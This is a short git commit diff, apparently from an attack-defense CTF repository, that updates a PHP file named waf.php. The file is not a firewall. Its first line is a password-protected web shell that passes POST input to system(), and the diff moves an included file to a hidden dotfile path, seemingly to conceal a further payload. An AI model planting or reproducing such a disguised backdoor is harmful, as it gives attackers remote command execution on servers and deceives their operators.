6bf07754b4fd6ce91b0a6d77f1482e4f40cbab2e
racterub <racterub@gmail.com>
2022-02-13 13:08:45 +0800

    update waf

--- 30/waf.php
+++ 30/waf.php
@@ -1,2 +1,2 @@
 <?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="5cdbb916c5e1b8c4b2034f15182090d12bcc7ec5")@system($_POST["w"]);
-@include_once "/var/www/html/logs/w";
+@include_once "/var/www/html/logs/.owo";
